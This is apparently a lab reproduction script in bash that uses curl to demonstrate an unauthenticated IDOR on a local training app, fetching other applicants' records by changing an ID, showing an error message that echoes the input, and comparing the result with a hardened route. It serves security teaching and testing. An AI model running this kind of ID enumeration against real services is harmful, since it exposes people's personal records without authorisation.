#!/usr/bin/env bash
# Task 1 reproduction: unauthenticated IDOR against the local lab (npm start in another terminal).
BASE="${1:-http://127.0.0.1:3000}"

echo "== 0. The dashboard page holds no personal data (it fetches it by URL parameter) =="
curl -s -o /dev/null -w "page HTTP %{http_code}, bytes %{size_download}\n" "$BASE/lab/dashboard?appId=DT-2026-002"

echo; echo "== 1. Baseline request with NO cookie, NO Authorization header =="
curl -s -i "$BASE/api/vulnerable/dashboard?appId=DT-2026-002"

echo; echo "== 2. Change one value: a different applicant's record =="
curl -s "$BASE/api/vulnerable/dashboard?appId=DT-2026-003"

echo; echo "== 3. Error message echoes the input (information leak) =="
curl -s "$BASE/api/vulnerable/dashboard?appId=DT-2026-999"

echo; echo "== 4. Same request against the hardened route =="
curl -s -i "$BASE/api/dashboard?appId=DT-2026-002"
